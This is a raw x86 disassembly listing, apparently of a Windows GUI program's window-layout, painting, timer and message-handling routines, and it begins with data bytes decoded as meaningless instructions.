je r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
cmpsd [ esi ] [ edi ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
push esi
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
push cs
inc esp
add [ edi + ecx + 0x44 ] dh
add [ ecx ] al
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
adc [ eax ] al
test eax 0xc8ff0001
push cs
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
sbb al 0x0
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
movsb [ edi ] [ esi ]
push ds
inc esp
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] al
0x7c0044 0xff00
sub [ ebp + 0x10043 ] ah
add [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
hlt
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
nop
movsb [ edi ] [ esi ]
inc ebx
add ah ch
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
adc [ eax ] al
0xe4ff0000 0x43a6
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edi + ecx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
pushfd
cmpsb [ esi ] [ edi ]
inc ebx
add [ ecx ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
lds eax [ ebx ]
add [ eax ] al
add [ eax + 0x1 ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8656c62
pop ss
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
push edi
add [ eax ] al
call [ eax - 0x13ffbc5c ]
adc [ eax ] al
cdq
add [ eax ] al
inc eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x43a6 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push edi
inc ebx
add ah dh
inc esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
xor al 0xa7
sub_429f64
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d310
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41dac0
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d310
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41dac0
pop ebx
mov esp ebp
pop ebp
retn
sub_42a028
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41d43c
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_429f64
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42a088
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_441eec
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fd94
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42a4cc
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_4033ac
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_439d50
mov edx 0x69
mov eax ebx
call sub_439d2c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42a120
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_441f48
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42a16c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_4203ac
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_4203c4
mov edi eax
mov eax ebx
call sub_439f74
mov [ esp ] eax
mov eax ebx
call sub_439fb8
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_40299c
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_40299c
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_40299c
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_40299c
mov esi eax
jmp r-xdata
sub_42a298
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_42a349
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42a16c
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_41db40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a350
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41d40c
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_41d734
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_41daf8
sub_42a358
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_451710
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_44105c
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_440d58
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_43b724
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_42a3f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_42a358
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_42a4cc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_4203ac
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4203c4
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_42a16c
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4203ac
push eax
mov eax [ ebx + 0x168 ]
call sub_4203c4
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_42a358
test al al
je r-xdata
sub_42a5f4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_4203ac
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4203ac
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_4203c4
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4203c4
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_42a65c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a50
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42a6e4
call sub_41ab9c
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42a6ac
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42a758
mov eax [ esi + 0x34 ]
call sub_41ac50
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42a6e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42a71e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a758
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42a7d7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a7de
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
sub_42a830
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44296c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov edx 0xb9
mov eax esi
call sub_439d2c
mov edx 0x29
mov eax esi
call sub_439d50
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42ac80
mov edx 0x1
mov eax esi
call sub_42ac9c
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_43a710
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_440fec
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42a8f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43dbe4
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42a964
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_440370
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_43e2f8
sub_42a9a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42aa94
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43a570
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_43f234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa9b
lea eax [ ebp - 0x14 ]
call sub_403ee8
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_440d58
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_440d58
push eax
call InvalidateRect
sub_42aaa4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42aadc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ac3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42a028
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42aaa4
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42a028
mov esi [ ebx + 0x208 ]
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
push ebp
call sub_42aaa4
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42a028
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d618
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41d9bc
mov eax ebx
call sub_441ea4
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_43c850
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43a570
mov eax [ ebp - 0x1c ]
call sub_4043a8
push eax
mov eax esi
call sub_41dd60
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac45
lea eax [ ebp - 0x1c ]
call sub_403ee8
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d734
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_41dc80
mov edx r-xdata
mov eax esi
call sub_41dbdc
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42acf0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cdc4
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42ad48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43f9ec
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42ae69
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43f9ec
call sub_4039d0
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_439d50
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_439d2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42ae84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4418a0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42aeb0
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_441eac
pop esi
pop ebx
retn
sub_42b054
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_433e30
mov edx edi
mov eax [ esi + 0x210 ]
call sub_413eec
xor edx edx
mov eax edi
call sub_43a490
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_43a6e4
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42b484
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42b0d8
